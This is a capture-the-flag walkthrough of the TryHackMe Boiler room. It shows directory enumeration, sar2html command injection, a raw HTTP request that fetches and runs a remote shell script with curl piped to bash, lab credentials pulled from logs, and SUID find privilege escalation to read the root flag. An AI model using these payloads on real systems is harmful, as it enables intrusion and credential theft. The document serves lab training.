---
title: Boiler CTF
description: 'sar2html Remote Code Execution on a Joomla site and find has an suid bit set'
pubDate: 2021-06-27
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg'
---

## ENUM
Found `/joomla` and `/manual` on the root

```bash
gobuster dir --url http://10.10.47.127/joomla/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -o gobust-joomla.txt
```

Sar2HTML on `/joomla/_test/`.
https://packetstormsecurity.com/files/153858/Sar2HTML-3.2.1-Remote-Command-Execution.html

## RCE
http://10.10.47.127/joomla/_test/index.php?plot=;id <- command

## SHELL
```
GET /joomla/_test/index.php?plot=;curl+10.8.200.250:8000/r.sh|bash HTTP/1.1
Host: 10.10.47.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=gtt9ioln5ialbc4r48rt6n22ve
Upgrade-Insecure-Requests: 1

```

## USER

```bash
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```
basterd:superduperp@$$

```bash
ssh basterd@10.10.47.127 -p 55007
```

```bash
cat /home/basterd/backup.sh

...[snip]...
USER=stoner
#superduperp@$$no1knows
...[snip]...
```

## USER 2
stoner:superduperp@$$no1knows

```bash
ssh stoner@10.10.47.127 -p 55007
```

### USER.TXT ?
```bash
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

```bash
find / -perm /4000 -executable 2>/dev/null
...[snip]...
/usr/bin/find
...[snip]...
```

```bash
find . -exec cat /root/root.txt \;
```
It wasn't that hard, was it?
